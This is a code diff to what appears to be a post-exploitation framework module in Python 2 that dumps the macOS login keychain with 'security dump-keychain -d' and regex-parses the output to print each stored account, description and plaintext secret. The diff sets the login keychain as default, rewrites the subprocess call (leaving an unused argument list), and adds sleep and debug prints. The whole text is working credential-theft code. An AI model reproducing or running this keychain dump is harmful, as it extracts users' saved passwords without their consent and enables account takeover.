@@ -52,7 +52,7 @@ class Module:
             'KeyChain' : {
                 'Description'   :   'Manual location of keychain to decrypt, otherwise default.',
                 'Required'      :   False,
-                'Value'         :   ''
+                'Value'         :   'login.keychain-db'
             }
         }
 
@@ -75,15 +75,20 @@ class Module:
 
         keyChain = self.options['KeyChain']['Value']
 
-        script = """
+        script = r"""
 import subprocess
 import re
+import time
 
-process = subprocess.Popen('security dump-keychain -d %s', stdout=subprocess.PIPE, shell=True)
-result = process.communicate()
-keychain = result[0].strip()
+args = ['dump-keychain', '-d', '%s']
+process = subprocess.Popen(executable='/usr/bin/security', args="dump-keychain", stdout=subprocess.PIPE, shell=True)
+print "sleeping"
+time.sleep(10)
+print "slept"
+keychain = process.communicate()
+print keychain
 find_account = re.compile('0x00000007\s\<blob\>\=\"([^\"]+)\"\n.*\n.*\"acct\"\<blob\>\=\"([^\"]+)\"\n.*\n.*\n.*\n\s+\"desc\"\<blob\>\=([^\n]+)\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\ndata\:\n([^\n]+)')
-accounts = find_account.findall(keychain)
+accounts = find_account.findall(keychain[0])
 for account in accounts:
     print("System: " + account[0])
     print("Description: " + account[2])
@@ -91,5 +96,5 @@ for account in accounts:
     print("Secret: " + account[3])
 
 """ % (keyChain)
-
+        print script
         return script
